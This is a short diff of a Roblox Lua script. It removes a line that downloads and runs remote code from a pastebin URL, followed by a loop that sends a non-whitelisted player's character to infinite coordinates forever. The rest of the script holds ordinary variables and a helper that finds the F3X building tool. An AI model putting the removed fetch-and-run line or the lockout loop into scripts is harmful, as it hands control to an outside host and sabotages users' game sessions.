@@ -5,15 +5,6 @@ local immune = {}
 local ban = {}
 local lockdown = false
 
-loadstring(game:HttpGet("https://pastebin.com/raw/T7xLWtUW"))()
-if not _G.isPlayerWhitelisted() then
-    while true do
-        for i = 1, 1000 do
-            p.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(math.huge, math.huge, math.huge))
-        end
-    end
-end
-
 local function getTool()
     local tool = "F3X" or "Building Tools"
     return p.Character:FindFirstChild(tool) or p.Backpack:FindFirstChild(tool)
